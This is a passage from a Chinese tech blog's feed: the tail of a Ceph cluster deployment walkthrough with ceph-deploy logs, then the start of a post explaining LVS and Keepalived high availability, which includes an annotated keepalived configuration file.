new cluster named ceph[ceph_deploy.new][INFO  ] making sure passwordless SSH succeeds[server11][DEBUG ] connected to host: server10[server11][INFO  ] Running command: ssh -CT -o BatchMode=yes server11[ceph_deploy.new][WARNIN] could not connect via SSH[ceph_deploy.new][INFO  ] will connect again with password promptThe authenticity of host &apos;server11 (192.168.110.11)&apos; can&apos;t be established.ECDSA key fingerprint is SHA256:e7cue1MdMEpwkjIK701euHvZbH+/pt3DW0z+EkV9tOc.ECDSA key fingerprint is MD5:cb:ce:07:fb:10:58:b8:71:49:3b:4f:d3:f4:c7:38:7a.Are you sure you want to continue connecting (yes/no)? yesWarning: Permanently added &apos;server11&apos; (ECDSA) to the list of known hosts.[server11][DEBUG ] connected to host: server11[server11][DEBUG ] detect platform information from remote host[server11][DEBUG ] detect machine type[ceph_deploy.new][INFO  ] adding public keys to authorized_keys[server11][DEBUG ] append contents to file[server11][DEBUG ] connected to host: server11[server11][DEBUG ] detect platform information from remote host[server11][DEBUG ] detect machine type[server11][DEBUG ] find the location of an executable[server11][INFO  ] Running command: /usr/sbin/ip link show[server11][INFO  ] Running command: /usr/sbin/ip addr show[server11][DEBUG ] IP addresses found: [u&apos;192.168.110.11&apos;][ceph_deploy.new][DEBUG ] Resolving host server11[ceph_deploy.new][DEBUG ] Monitor server11 at 192.168.110.11[ceph_deploy.new][DEBUG ] Monitor initial members are [&apos;server11&apos;][ceph_deploy.new][DEBUG ] Monitor addrs are [&apos;192.168.110.11&apos;][ceph_deploy.new][DEBUG ] Creating a random mon key...[ceph_deploy.new][DEBUG ] Writing monitor keyring to ceph.mon.keyring...[ceph_deploy.new][DEBUG ] Writing initial config to ceph.conf...[cephadm@server10 ceph-cluster]$ lsceph.conf  ceph-deploy-ceph.log  ceph.mon.keyring[cephadm@server10 ceph-cluster]$</code></pre><p>&#x7F16;&#x8F91;&#x751F;&#x6210;ceph.conf&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#xFF0C;&#x5728;[global]&#x914D;&#x7F6E;&#x6BB5;&#x4E2D;&#x8BBE;&#x7F6E;Ceph&#x96C6;&#x7FA4;&#x9762;&#x5411;&#x5BA2;&#x6237;&#x7AEF;&#x901A;&#x4FE1;&#x65F6;&#x4F7F;&#x7528;&#x7684;IP&#x5730;&#x5740;&#x6240;&#x5728;&#x7684;&#x7F51;&#x7EDC;</p><pre><code>Last login: Tue Jun 14 18:09:03 2022 from 192.168.110.1[root@store03 ~]# ceph-volume lvm list====== osd.2 =======  [block]       /dev/ceph-b7434f6a-3353-4795-8a8e-19b9ac3d4f57/osd-block-b91adee1-bd7c-41ec-a283-1e46cdcb0660      block device              /dev/ceph-b7434f6a-3353-4795-8a8e-19b9ac3d4f57/osd-block-b91adee1-bd7c-41ec-a283-1e46cdcb0660      block uuid                f4M8H8-xGEn-y4yN-Kt1l-8nBb-IYNN-uZZiHM      cephx lockbox secret      cluster fsid              ffd17baf-ce0e-48f4-b59b-2a84049aca37      cluster name              ceph      crush device class        None      encrypted                 0      osd fsid                  b91adee1-bd7c-41ec-a283-1e46cdcb0660      osd id                    2      type                      block      vdo                       0      devices                   /dev/sdb[root@store03 ~]#</code></pre><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;&amp;#x6982;&amp;#x5FF5;&quot;&gt;&lt;a href=&quot;#&amp;#x6982;&amp;#x5FF5;&quot; class=&quot;headerlink&quot; title=&quot;&amp;#x6982;&amp;#x5FF5;&quot;&gt;&lt;/a&gt;&amp;#x6982;&amp;#x5FF5;&lt;/h2&gt;&lt;h3 id=&quot;&amp;#x5206;&amp;
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>LVS和KeepAlived实现高可用集群</title>
    <link href="https://marnm.github.io//posts/640aafef/"/>
    <id>https://marnm.github.io//posts/640aafef/</id>
    <published>2022-06-10T08:26:16.000Z</published>
    <updated>2022-09-02T19:24:28.572Z</updated>
    
    <content type="html"><![CDATA[<h2 id="keepalived&#x76F8;&#x5173;"><a href="#keepalived&#x76F8;&#x5173;" class="headerlink" title="keepalived&#x76F8;&#x5173;"></a>keepalived&#x76F8;&#x5173;</h2><p>keepalive&#x7684;&#x5B66;&#x4E60;&#x53C2;&#x8003;&#x7F51;&#x7AD9;&#xFF1A;<a href="https://www.keepalived.org/" target="_blank" rel="noopener">https://www.keepalived.org/</a></p><p>&#x5728;&#x5B66;&#x4E60;keepalived&#x4E4B;&#x524D;, &#x6211;&#x4EEC;&#x6765;&#x601D;&#x8003;&#x4E00;&#x4E2A;&#x95EE;&#x9898;&#xFF1A;<strong>LVS&#x53EA;&#x662F;&#x8D1F;&#x8D23;&#x8D1F;&#x8F7D;&#x5747;&#x8861;&#x7684;&#x8F6C;&#x53D1;&#xFF0C;&#x90A3;&#x5982;&#x679C;&#x540E;&#x53F0;&#x7684;Real Server&#x7684;&#x670D;&#x52A1;&#x6302;&#x6389;&#x4EE5;&#x540E;&#xFF0C;LVS&#x662F;&#x5426;&#x80FD;&#x4E3B;&#x52A8;&#x628A;&#x8FD9;&#x4E2A;&#x6458;&#x9664;&#x6389;&#x5417;&#xFF1F;</strong> &#x7B54;&#x6848;&#x662F;&#xFF1A;<strong>&#x80AF;&#x5B9A;&#x4E0D;&#x884C;&#x7684;</strong>&#xFF0C;&#x5C31;&#x662F;LVS&#x4E0D;&#x5177;&#x5907;&#x628A;&#x540E;&#x7AEF;&#x6302;&#x6389;&#x7684;Real Server&#x6458;&#x9664;&#x6389;&#xFF0C;&#x6240;&#x4EE5;keepalived&#x7684;&#x5E94;&#x7528;&#x800C;&#x751F;&#x3002;</p><p>keepalived &#x8D77;&#x521D;&#x5C31;&#x662F;&#x4E3A;LVS&#x8BBE;&#x8BA1;&#x7684;&#xFF0C;&#x4E13;&#x95E8;&#x7528;&#x6765;&#x76D1;&#x63A7;&#x96C6;&#x7FA4;&#x7CFB;&#x7EDF;&#x4E2D;&#x5404;&#x4E2A;&#x670D;&#x52A1;&#x8282;&#x70B9;&#x7684;&#x72B6;&#x6001;&#xFF0C;<strong>&#x5B83;&#x6839;&#x636E;tcp/ip&#x53C2;&#x8003;&#x6A21;&#x578B;&#x7684;&#x7B2C;&#x4E09;&#x56DB;&#x548C;&#x7B2C;&#x4E94;&#x5C42;&#x4EA4;&#x6362;&#x673A;&#x5236;&#x68C0;&#x6D4B;&#x6BCF;&#x4E2A;&#x670D;&#x52A1;&#x8282;&#x70B9;&#x7684;&#x72B6;&#x6001;&#xFF0C;&#x6BCF;&#x4E2A;&#x670D;&#x52A1;&#x8282;&#x70B9;&#x5F02;&#x5E38;&#x6216;&#x8005;&#x5DE5;&#x4F5C;&#x969C;&#x788D;&#xFF0C;keepalvied&#x5C06;&#x7ACB;&#x523B;&#x68C0;&#x6D4B;&#x5230;&#xFF0C;&#x5E76;&#x628A;&#x969C;&#x788D;&#x8282;&#x70B9;&#x5254;&#x9664;&#xFF0C;&#x662F;&#x6BEB;&#x79D2;&#x7EA7;&#x7684;</strong>&#xFF0C;&#x5F53;&#x540E;&#x53F0;&#x8282;&#x70B9;&#x6062;&#x590D;&#x6B63;&#x5E38;&#x4EE5;&#x540E;&#xFF0C;keepalived&#x6709;&#x81EA;&#x52A8;&#x5C06;&#x670D;&#x52A1;&#x8282;&#x70B9;&#x91CD;&#x65B0;&#x6DFB;&#x52A0;&#x5728;&#x670D;&#x52A1;&#x5668;&#x96C6;&#x7FA4;&#x4E2D;&#x3002;<br><a id="more"></a><br>keepalvied&#x540E;&#x6765;&#x53C8;&#x52A0;&#x4E86;VRRP&#x529F;&#x80FD;&#xFF0C;VRRP&#xFF08;&#x865A;&#x62DF;&#x8DEF;&#x7531;&#x5668;&#x5197;&#x4F59;&#x534F;&#x8BAE;&#xFF09;&#xFF0C;&#x51FA;&#x73B0;&#x7684;&#x76EE;&#x7684;&#x5C31;&#x662F;&#x89E3;&#x51B3;&#x9759;&#x6001;&#x8DEF;&#x7531;&#x5355;&#x70B9;&#x6545;&#x969C;&#x7684;&#x95EE;&#x9898;&#xFF0C;&#x901A;&#x8FC7;vrrp&#x53EF;&#x4EE5;&#x5B9E;&#x73B0;&#x7F51;&#x7EDC;&#x4E0D;&#x95F4;&#x65AD;&#x7A33;&#x5B9A;&#x8FD0;&#x884C;&#x3002;</p><p>Keepalived&#x662F;&#x7528;C&#x8BED;&#x8A00;&#x7F16;&#x5199;&#x7684;&#x8DEF;&#x7531;&#x8F6F;&#x4EF6;&#x3002;&#x8BE5;&#x9879;&#x76EE;&#x7684;&#x4E3B;&#x8981;&#x76EE;&#x6807;&#x662F;&#x4E3A;Linux&#x7CFB;&#x7EDF;&#x548C;&#x57FA;&#x4E8E;Linux&#x7684;&#x57FA;&#x7840;&#x7ED3;&#x6784;&#x63D0;&#x4F9B;&#x8D1F;&#x8F7D;&#x5747;&#x8861;&#x548C;&#x9AD8;&#x53EF;&#x7528;&#x6027;&#x7684;&#x7B80;&#x5355;&#x800C;&#x5F3A;&#x5927;&#x7684;&#x529F;&#x80FD;&#x3002;&#x8D1F;&#x8F7D;&#x5E73;&#x8861;&#x6846;&#x67B6;&#x4F9D;&#x8D56;&#x4E8E;&#x63D0;&#x4F9B;&#x7B2C;4&#x5C42;&#x8D1F;&#x8F7D;&#x5E73;&#x8861;&#x7684;&#x8457;&#x540D;&#x4E14;&#x5E7F;&#x6CDB;&#x4F7F;&#x7528;&#x7684;Linux&#x865A;&#x62DF;&#x670D;&#x52A1;&#x5668;&#xFF08;IPVS&#xFF09;&#x5185;&#x6838;&#x6A21;&#x5757;&#x3002;Keepalived&#x5B9E;&#x73B0;&#x4E86;&#x4E00;&#x7EC4;VIP&#x529F;&#x80FD;&#xFF0C;&#x4EE5;&#x6839;&#x636E;&#x5176;&#x8FD0;&#x884C;&#x72B6;&#x51B5;&#x52A8;&#x6001;&#xFF0C;&#x81EA;&#x9002;&#x5E94;&#x5730;&#x7EF4;&#x62A4;&#x548C;&#x7BA1;&#x7406;&#x8D1F;&#x8F7D;&#x5E73;&#x8861;&#x7684;&#x670D;&#x52A1;&#x5668;&#x6C60;&#x3002;<strong>&#x53E6;&#x4E00;&#x65B9;&#x9762;&#xFF0C;VRRP&#x5B9E;&#x73B0;&#x4E86;&#x9AD8;&#x53EF;&#x7528;&#x6027; &#x534F;&#x8BAE;&#x3002;VRRP&#x662F;&#x8DEF;&#x7531;&#x5668;&#x6545;&#x969C;&#x8F6C;&#x79FB;&#x7684;&#x57FA;&#x7840;</strong>&#x3002;</p><p>&#x6B64;&#x5916;&#xFF0C;Keepalived&#x8FD8;&#x5B9E;&#x73B0;&#x4E86;&#x4E00;&#x7EC4;VRRP&#x6709;&#x9650;&#x72B6;&#x6001;&#x673A;&#x7684;&#x6302;&#x94A9;&#xFF0C;&#x4ECE;&#x800C;&#x63D0;&#x4F9B;&#x4E86;&#x4F4E;&#x7EA7;&#x548C;&#x9AD8;&#x901F;&#x534F;&#x8BAE;&#x4EA4;&#x4E92;&#x3002;<strong>&#x4E3A;&#x4E86;&#x63D0;&#x4F9B;&#x6700;&#x5FEB;&#x7684;&#x7F51;&#x7EDC;&#x6545;&#x969C;&#x68C0;&#x6D4B;&#xFF0C;Keepalived&#x5B9E;&#x65BD;BFD&#x534F;&#x8BAE;&#x3002;VRRP&#x72B6;&#x6001;&#x8F6C;&#x6362;&#x53EF;&#x4EE5;&#x8003;&#x8651;BFD&#x63D0;&#x793A;&#x6765;&#x9A71;&#x52A8;&#x5FEB;&#x901F;&#x72B6;&#x6001;&#x8F6C;&#x6362;&#x3002;Keepalived&#x6846;&#x67B6;&#x53EF;&#x4EE5;&#x72EC;&#x7ACB;&#x4F7F;&#x7528;&#xFF0C;&#x4E5F;&#x53EF;&#x4EE5;&#x4E00;&#x8D77;&#x4F7F;&#x7528;&#x4EE5;&#x63D0;&#x4F9B;&#x5F39;&#x6027;&#x57FA;&#x7840;&#x67B6;&#x6784;&#x3002;</strong></p><p>keepalived&#x652F;&#x6301;&#x591A;&#x7EC4;VIP&#x7684;&#x64CD;&#x4F5C;&#xFF0C;&#x5C31;&#x662F;&#x4E00;&#x53F0;&#x670D;&#x52A1;&#x5668;&#x4E0A;&#x53EF;&#x4EE5;&#x90E8;&#x7F72;&#x591A;&#x53F0;VIP&#xFF0C;&#x53EF;&#x4EE5;&#x7406;&#x89E3;&#x4E3A;&#x6BCF;&#x4E2A;VIP&#x662F;&#x4E00;&#x7EC4;&#x64CD;&#x4F5C;&#x3002;</p><p><strong>Keepalived&#x7684;&#x4F7F;&#x7528;&#x573A;&#x666F;</strong><br>&#x53EF;&#x4EE5;&#x8BF4;&#xFF0C;keepalived&#x672C;&#x8EAB;&#x5C31;&#x662F;&#x7ED9;LVS&#x91CF;&#x8EAB;&#x5B9A;&#x505A;&#x7684;&#xFF0C;LVS&#x867D;&#x7136;&#x662F;&#x53EF;&#x4EE5;&#x8FDB;&#x884C;&#x8D1F;&#x8F7D;&#x5747;&#x8861;&#x7684;&#x8BF7;&#x6C42;&#x7684;&#x8F6C;&#x53D1;&#xFF0C;&#x5982;&#x679C;&#x540E;&#x7AEF;&#x670D;&#x52A1;&#x5668;&#x68C0;&#x67E5;&#x5230;&#x670D;&#x52A1;&#x5668;&#x6545;&#x969C;&#xFF0C;LVS&#x662F;&#x53EF;&#x4EE5;&#x4E3B;&#x52A8;&#x5207;&#x9664;&#x7684;&#xFF0C;&#x8FD9;&#x4E2A;LVS&#x672C;&#x8EAB;&#x5177;&#x5907;&#x7684;&#x529F;&#x80FD;&#xFF0C;&#x800C;&#x4E14;&#x5207;&#x9664;&#x540E;&#x7AEF;Real Server&#x7684;&#x65F6;&#x95F4;&#x90FD;&#x662F;&#x5728;&#x6BEB;&#x79D2;&#x7EA7;&#x522B;&#xFF0C;&#x7279;&#x522B;&#x7684;&#x5FEB;&#x901F;&#xFF0C;&#x6BD5;&#x7ADF;LVS&#x5DF2;&#x7ECF;&#x96C6;&#x6210;&#x5230;Linux&#x7CFB;&#x7EDF;&#x5185;&#x6838;&#x4E86;&#x3002;&#x90A3;&#x5C31;&#x6709;&#x4E00;&#x4E2A;&#x95EE;&#x9898;, &#x5982;&#x679C;LVS&#x670D;&#x52A1;&#x5668;&#x6302;&#x6389;&#x4E86;&#x5462;?&#x6211;&#x4EEC;&#x7684;&#x670D;&#x52A1;&#x662F;&#x4E0D;&#x662F;&#x5C31;&#x4E0D;&#x53EF;&#x7528;&#x4E86;&#x5462;&#xFF1F;&#x90A3;&#x5C31;&#x6765;&#x770B;&#x770B;&#x6211;&#x4EEC;keepalived&#x7684;&#x4F7F;&#x7528;&#x573A;&#x666F;&#x4E86;&#x3002;</p><p>LVS&#x548C;keepalived&#x53EF;&#x4EE5;&#x8BF4;&#x662F;&#x5929;&#x7136;&#x7684;&#x96C6;&#x6210;, &#x6211;&#x4EEC;&#x5728;linux&#x7CFB;&#x7EDF;&#x5B89;&#x88C5;&#x7684;&#x65F6;&#x5019;, &#x53EF;&#x80FD;&#x90FD;&#x4E0D;&#x9700;&#x8981;&#x4EC0;&#x4E48;&#x7279;&#x6B8A;&#x7684;LVS&#x7684;&#x914D;&#x7F6E;, lvs+keepalived&#x7684;&#x96C6;&#x6210;, &#x53EA;&#x9700;&#x8981;&#x5728;keepalived&#x7684;&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#x4E2D;&#x589E;&#x52A0;&#x914D;&#x7F6E;&#x5C31;ok</p><p>keepalive&#x63D0;&#x4F9B;&#x4E86;&#x4E3B;&#x4ECE;&#x5207;&#x6362;&#x7684;&#x529F;&#x80FD;, &#x4E3B;&#x4ECE;&#x4E4B;&#x95F4;&#x6709;&#x5FC3;&#x8DF3;&#x68C0;&#x6D4B;, &#x5982;&#x679C;&#x53D1;&#x73B0;&#x4E3B;&#x4ECE;&#x6302;&#x6389;, keepalived&#x4F1A;&#x81EA;&#x52A8;&#x8FDB;&#x884C;&#x4E3B;&#x4ECE;&#x7684;&#x5207;&#x6362;</p><p>&#x5355;&#x4F53;&#x67B6;&#x6784;&#x4E2D;, &#x6211;&#x4EEC;&#x6700;&#x5E38;&#x4F7F;&#x7528;lvs+keepalived&#x7684;&#x529F;&#x80FD;</p><h3 id="Keepalived&#x7684;&#x5DE5;&#x4F5C;&#x539F;&#x7406;"><a href="#Keepalived&#x7684;&#x5DE5;&#x4F5C;&#x539F;&#x7406;" class="headerlink" title="Keepalived&#x7684;&#x5DE5;&#x4F5C;&#x539F;&#x7406;"></a>Keepalived&#x7684;&#x5DE5;&#x4F5C;&#x539F;&#x7406;</h3><ul><li>&#x5206;&#x4E3A;&#x4E24;&#x5927;&#x5C42;&#xFF1A;&#x5185;&#x6838;&#x7A7A;&#x95F4;(Kernel Space)&#x3001;&#x7528;&#x6237;&#x7A7A;&#x95F4;(User Space)</li><li>IPVS(IP Virtual Server): &#x5B9E;&#x73B0;&#x4F20;&#x8F93;&#x5C42;&#x8D1F;&#x8F7D;&#x5E73;&#x8861;&#xFF0C;&#x4E5F;&#x79F0;&#x4E3A;&#x7B2C;4&#x5C42;&#x4EA4;&#x6362;&#xFF1B;</li><li>NETLINK: &#x7528;&#x4E8E;&#x5728;&#x5185;&#x6838;&#x548C;&#x7528;&#x6237;&#x7A7A;&#x95F4;&#x8FDB;&#x7A0B;&#x4E4B;&#x95F4;&#x4F20;&#x8F93;&#x4FE1;&#x606F;&#xFF1B;</li></ul><p><img src="http://192.168.84.188:8081/uploads/1655014550645262515keepalived.png" alt=""></p><p><strong>Keepalived&#x5206;&#x4E3A;3&#x4E2A;&#x5B88;&#x62A4;&#x8FDB;&#x7A0B;</strong>  </p><ul><li>&#x7236;&#x8FDB;&#x7A0B;&#xFF1A;&#x5F88;&#x7B80;&#x5355;&#xFF0C;&#x8D1F;&#x8F7D;fork&#x5B50;&#x8FDB;&#x7A0B;&#xFF0C;&#x5E76;&#x76D1;&#x89C6;&#x5B50;&#x8FDB;&#x7A0B;&#x5065;&#x5EB7;&#x72B6;&#x6001;</li><li>&#x5B50;&#x8FDB;&#x7A0B;A&#xFF1A;&#x8D1F;&#x8D23;VRRP&#x6846;&#x67B6;</li><li>&#x5B50;&#x8FDB;&#x7A0B;B&#xFF1A;&#x8D1F;&#x8D23;&#x5065;&#x5EB7;&#x68C0;&#x67E5;</li></ul><h3 id="&#x8FD0;&#x884C;&#x539F;&#x7406;"><a href="#&#x8FD0;&#x884C;&#x539F;&#x7406;" class="headerlink" title="&#x8FD0;&#x884C;&#x539F;&#x7406;"></a>&#x8FD0;&#x884C;&#x539F;&#x7406;</h3><p>keepalived &#x901A;&#x8FC7;&#x9009;&#x4E3E;&#xFF08;&#x770B;&#x670D;&#x52A1;&#x5668;&#x8BBE;&#x7F6E;&#x7684;&#x6743;&#x91CD;&#xFF09;&#x6311;&#x9009;&#x51FA;&#x4E00;&#x53F0;&#x70ED;&#x5907;&#x670D;&#x52A1;&#x5668;&#x505A; MASTER &#x673A;&#x5668;&#xFF0C;MASTER &#x673A;&#x5668;&#x4F1A;&#x88AB;&#x5206;&#x914D;&#x5230;&#x4E00;&#x4E2A;&#x6307;&#x5B9A;&#x7684;&#x865A;&#x62DF; ip&#xFF0C;&#x5373;VIP, &#x5916;&#x90E8;&#x7A0B;&#x5E8F;&#x53EF;&#x901A;&#x8FC7;&#x8BE5; VIP &#x8BBF;&#x95EE;&#x8FD9;&#x53F0;&#x670D;&#x52A1;&#x5668;&#xFF0C;&#x5982;&#x679C;&#x8FD9;&#x53F0;&#x670D;&#x52A1;&#x5668;&#x51FA;&#x73B0;&#x6545;&#x969C;&#xFF08;&#x65AD;&#x7F51;&#xFF0C;&#x91CD;&#x542F;&#xFF0C;&#x6216;&#x8005;&#x672C;&#x673A;&#x5668;&#x4E0A;&#x7684; keepalived crash &#x7B49;&#xFF09;&#xFF0C;keepalived &#x4F1A;&#x4ECE;&#x5176;&#x4ED6;&#x7684;&#x5907;&#x4EFD;&#x673A;&#x5668;&#x4E0A;&#x91CD;&#x9009;&#xFF08;&#x8FD8;&#x662F;&#x770B;&#x670D;&#x52A1;&#x5668;&#x8BBE;&#x7F6E;&#x7684;&#x6743;&#x91CD;&#xFF09;&#x4E00;&#x53F0;&#x673A;&#x5668;&#x505A; MASTER &#x5E76;&#x5206;&#x914D;&#x540C;&#x6837;&#x7684;&#x865A;&#x62DF; IP&#xFF0C;&#x5145;&#x5F53;&#x524D;&#x4E00;&#x53F0; MASTER &#x7684;&#x89D2;&#x8272;&#x3002;<strong>&#x6743;&#x91CD;&#x8D8A;&#x9AD8;&#xFF0C;&#x5907;&#x7528;&#x673A;&#x5668;&#x88AB;&#x62C9;&#x8D77;&#x6765;&#x7684;&#x5360;&#x6BD4;&#x5C31;&#x8D8A;&#x5927;&#xFF0C;&#x4E00;&#x822C;&#x7684;&#x4E3B;&#x5907;&#x5C31;&#x53EF;&#x4EE5;&#x6EE1;&#x8DB3;&#x6211;&#x4EEC;&#x7684;&#x9700;&#x6C42;&#x3002;</strong></p><h2 id="LVS-Keepalived"><a href="#LVS-Keepalived" class="headerlink" title="LVS+Keepalived"></a>LVS+Keepalived</h2><p>lvs&#x548C;keepalived&#x5E94;&#x8BE5;&#x53EF;&#x4EE5;&#x8BF4;&#x662F;&#x5929;&#x7136;&#x7684;&#x96C6;&#x6210;, &#x5728;&#x56E0;&#x4E3A;LVS&#x5DF2;&#x7ECF;&#x96C6;&#x6210;&#x5230;linux&#x5185;&#x6838;&#x7CFB;&#x7EDF;&#x4E2D;, &#x6211;&#x4EEC;&#x53EA;&#x9700;&#x8981;&#x914D;&#x7F6E;&#x4E00;&#x4E0B;keepalived&#x7684;&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#x5C31;&#x53EF;&#x4EE5;&#x4E86;, &#x90A3;&#x6211;&#x4EEC;&#x8FD8;&#x662F;&#x4E3B;&#x8981;&#x6765;&#x7814;&#x7A76;&#x4E00;&#x4E0B;keepalived&#x7684;&#x914D;&#x7F6E;&#x6587;&#x4EF6;, &#x5C31;&#x53EF;&#x4EE5;&#x8F7B;&#x677E;&#x7684;&#x4F7F;&#x7528;&#x4E86;</p><pre><code class="properties">#&#x5168;&#x5C40;&#x914D;&#x7F6E;global_defs {  notification_email { #&#x8BBE;&#x7F6E;&#x62A5;&#x8B66;&#x90AE;&#x4EF6;&#x5730;&#x5740;&#xFF0C;&#x6BCF;&#x884C;&#x4E00;&#x4E2A;&#xFF0C;&#xFF08;&#x5982;&#x679C;&#x8981;&#x5F00;&#x542F;&#x90AE;&#x4EF6;&#x62A5;&#x8B66;&#xFF0C;&#x9700;&#x8981;&#x5F00;&#x542F;&#x672C;&#x673A;&#x7684;sendmail&#x670D;&#x52A1;&#xFF09;    2461590502@qq.com  }  notification_email_from keepalived_server@qq.com   #&#x8BBE;&#x7F6E;&#x90AE;&#x4EF6;&#x7684;&#x53D1;&#x9001;&#x5730;&#x5740;  smtp_server smtp.qq.com           #&#x8BBE;&#x7F6E;&#x90AE;&#x4EF6;&#x7684;smtp server&#x5730;&#x5740;  smtp_connect_timeout 30           #&#x8BBE;&#x7F6E;&#x8FDE;&#x63A5;smtp server&#x7684;&#x8D85;&#x65F6;&#x65F6;&#x95F4;  router_id LVS_DEVEL             #&#x8868;&#x793A;keepalived&#x670D;&#x52A1;&#x5668;&#x7684;&#x4E00;&#x4E2A;&#x6807;&#x8BC6;&#xFF0C;&#x662F;&#x53D1;&#x90AE;&#x4EF6;&#x65F6;&#x663E;&#x793A;&#x5728;&#x90AE;&#x4EF6;&#x4E3B;&#x9898;&#x4E2D;&#x7684;&#x4FE1;&#x606F;}#keepalived&#x7684;VRRPD&#x914D;&#x7F6E;&#xFF0C;&#x662F;&#x6240;&#x6709;keepalived&#x914D;&#x7F6E;&#x7684;&#x6838;&#x5FC3;#VRRP&#x5B9E;&#x4F8B;&#x914D;&#x7F6E;vrrp_instance VIP_142   #&#x662F;VRRP&#x5B9E;&#x4F8B;&#x5F00;&#x59CB;&#x7684;&#x6807;&#x8BC6;&#xFF0C;&#x540E;&#x8DDF;VRRP&#x5B9E;&#x4F8B;&#x540D;&#x79F0;{state MASTER       #keepalived&#x7684;&#x89D2;&#x8272;&#xFF0C;MASTER&#x4E3B;&#xFF0C;BACKUP&#x5907;interface eth0       #&#x7528;&#x4E8E;&#x6307;&#x5B9A;HA&#x76D1;&#x6D4B;&#x7F51;&#x7EDC;&#x7684;&#x63A5;&#x53E3;virtual_router_id 142     #&#x865A;&#x62DF;&#x8DEF;&#x7531;&#x6807;&#x8BC6;&#xFF0C;&#x8FD9;&#x4E2A;&#x6807;&#x8BC6;&#x662F;&#x4E00;&#x4E2A;&#x6570;&#x5B57;&#xFF0C;&#x540C;&#x4E00;&#x4E2A;VRRP&#x5B9E;&#x4F8B;&#x4F7F;&#x7528;&#x552F;&#x4E00;&#x7684;&#x4E00;&#x4E2A;&#x6807;&#x8BC6;&#xFF0C;&#x5373;&#x5728;&#x540C;&#x4E00;&#x4E2A;vrrp_instance&#x4E0B;&#xFF0C;MASTER&#x548C;BACKUP&#x5FC5;&#x987B;&#x662F;&#x4E00;&#x81F4;&#x7684;&#xFF01;priority 100         #&#x6743;&#x91CD;&#x4F18;&#x5148;&#x7EA7;advert_int 2         #&#x7528;&#x4E8E;&#x8BBE;&#x5B9A;master&#x548C;backup&#x4E3B;&#x673A;&#x4E4B;&#x95F4;&#x540C;&#x6B65;&#x68C0;&#x67E5;&#x7684;&#x65F6;&#x95F4;&#x95F4;&#x9694;&#xFF0C;&#x5355;&#x4F4D;&#x662F;&#x79D2;garp_master_delay 10     #&#x7528;&#x4E8E;&#x5207;&#x6362;&#x5230;master&#x72B6;&#x6001;&#x540E;&#x5EF6;&#x65F6;&#x8FDB;&#x884C;Gratuitous arp&#x8BF7;&#x6C42;&#x7684;&#x65F6;&#x95F4;smtp_alert         #&#x8868;&#x793A;&#x662F;&#x5426;&#x5F00;&#x542F;&#x90AE;&#x4EF6;&#x901A;&#x77E5;(&#x7528;&#x5168;&#x5C40;&#x533A;&#x57DF;&#x7684;&#x90AE;&#x4EF6;&#x8BBE;&#x7F6E;&#x6765;&#x53D1;&#x901A;&#x77E5;)authentication       #&#x4E3B;&#x5907;&#x4E4B;&#x95F4;&#x8FDB;&#x884C;&#x901A;&#x4FE1;&#x7684;&#x9A8C;&#x8BC1;&#x7C7B;&#x578B;&#x548C;&#x5BC6;&#x7801;&#xFF1A;&#x9A8C;&#x8BC1;&#x7C7B;&#x578B;&#x4E3B;&#x8981;&#x6709;PASS&#x548C;AH&#x4E24;&#x79CD;&#xFF0C;&#x4E00;&#x4E2A;&#x5728;vrrp_instance&#x4E0B;&#xFF0C;MASTER&#x548C;backup&#x5FC5;&#x987B;&#x4F7F;&#x7528;&#x76F8;&#x540C;&#x7684;&#x5BC6;&#x7801;&#x624D;&#x53EF;&#x4EE5;&#x901A;&#x4FE1;{auth_type PASSauth_pass 123456}#virtual_ipaddress&#x7528;&#x4E8E;&#x8BBE;&#x7F6E;&#x865A;&#x62DF;ip&#x5730;&#x5740;&#xFF0C;&#x53EF;&#x4EE5;&#x8BBE;&#x7F6E;&#x591A;&#x4E2A;vip&#xFF0C;&#x6BCF;&#x884C;&#x4E00;&#x4E2A;&#xFF0C;virtual_ipaddress{10.95.0.200/24}track_interface     #&#x7528;&#x4E8E;&#x8BBE;&#x7F6E;&#x4E00;&#x4E9B;&#x989D;&#x5916;&#x7684;&#x7F51;&#x7EDC;&#x76D1;&#x63A7;&#x63A5;&#x53E3;&#xFF0C;&#x5176;&#x4E2D;&#x4EFB;&#x4F55;&#x4E00;&#x4E2A;&#x7F51;&#x7EDC;&#x63A5;&#x53E3;&#x51FA;&#x73B0;&#x6545;&#x969C;&#xFF0C;keepalived&#x90FD;&#x4F1A;&#x8FDB;&#x53BB;fault&#x72B6;&#x6001;&#xFF01;{ens33}nopreempt       #&#x8BBE;&#x7F6E;&#x4E0D;&#x62A2;&#x5360;&#x529F;&#x80FD;&#xFF0C;&#x53EA;&#x80FD;&#x5728;backup&#x4E0A;&#x4F7F;&#x7528;&#xFF0C;&#x77E5;&#x9053;&#x673A;&#x5668;&#x6709;&#x6545;&#x969C;&#x4E86;&#x624D;&#x5207;&#x6362;&#xFF0C;preemtp_delay 300   #&#x7528;&#x4E8E;&#x8BBE;&#x7F6E;&#x62A2;&#x5360;&#x7684;&#x5EF6;&#x65F6;&#x65F6;&#x95F4;&#xFF0C;&#xFF08;&#x4F8B;&#xFF1A;&#x5F00;&#x542F;&#x542F;&#x52A8;&#x6CA1;&#x5FC5;&#x8981;&#x62A2;&#x5360;&#xFF09;}#&#x4EE5;&#x4E0B;&#x662F;lvs&#x7684;&#x4E3B;&#x8981;&#x4E3B;&#x8981;&#x914D;&#x7F6E;&#x4FE1;&#x606F;&#xFF0C;&#x4E3B;&#x8981;&#x5B9E;&#x73B0;lvs&#x7684;ip&#x5305;&#x8F6C;&#x53D1;&#x529F;&#x80FD;&#xFF01;virtual_server 10.95.0.200 80       #&#x865A;&#x62DF;ip&#x548C;&#x7AEF;&#x53E3;{delay_loop 6       #&#x8BBE;&#x7F6E;&#x5065;&#x5EB7;&#x68C0;&#x67E5;&#x7684;&#x65F6;&#x95F4;&#x95F4;&#x9694;lb_algo wrr         #&#x8BBE;&#x7F6E;&#x8D1F;&#x8F7D;&#x8C03;&#x5EA6;&#x7B97;&#x6CD5;lb_kind DR         